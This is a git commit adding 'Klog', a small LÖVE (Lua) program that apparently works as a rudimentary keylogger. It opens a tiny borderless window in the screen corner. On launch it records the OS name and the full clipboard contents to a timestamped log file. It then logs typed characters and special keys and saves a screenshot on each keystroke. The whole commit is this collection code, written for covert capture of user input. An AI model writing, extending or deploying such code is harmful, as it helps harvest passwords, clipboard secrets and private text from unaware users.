8fe6bf1759ef975dd1d9664c3f038e2aedb450fa
rptp <radpol002@utp.edu.pl>
2016-09-16 12:19:17 +0200

    Add files via upload

---
+++ Klog/conf.lua
@@ -0,0 +1,5 @@
+function love.conf(t)
+	t.window.width = 64
+    t.window.height = 32
+	t.window.borderless = true
+end
---
+++ Klog/main.lua
@@ -0,0 +1,43 @@
+﻿local utf8 = require("utf8")
+
+-- Adres folderu do składowania logow
+fileaddress = 'B:/LOVE/Klog/log/'
+--
+
+
+function love.draw()
+   love.graphics.print("FPS: "..tostring(love.timer.getFPS( )), 10, 10)
+end
+function love.load()
+	love.window.setPosition( 0, 0, 1 )
+	love.filesystem.setIdentity('KLscreenshot');
+	local datetime = os.date('%d_%m_%y %H_%M_%S')
+	file = io.open(fileaddress..datetime..'.txt', 'w')
+	file:write('\n\n'..datetime..'\n')
+	local os2 = love.system.getOS()
+	local clipboard = love.system.getClipboardText()
+	file:write('System operacyjny: '..os2..'\n')
+	file:write('Zawartosc schowka w chwili otwarcia programu: >>'..clipboard..'<<\n')
+    love.keyboard.setKeyRepeat(false)
+end
+ 
+ 
+function love.textinput(t)
+	local screenshot = love.graphics.newScreenshot();
+	screenshot:encode('png', os.time() .. '.png');
+	file:write(t)
+end
+
+
+function love.keypressed(key)
+	local screenshot = love.graphics.newScreenshot();
+	if key == 'escape' then
+		file:close()
+		screenshot:encode('png', os.time() .. '.png');
+		love.event.quit()
+	elseif key == 'tab' then
+		file:write('\n[TAB]')
+	elseif key == 'backspace' then
+		file:write('[BKSP]')
+	end
+end
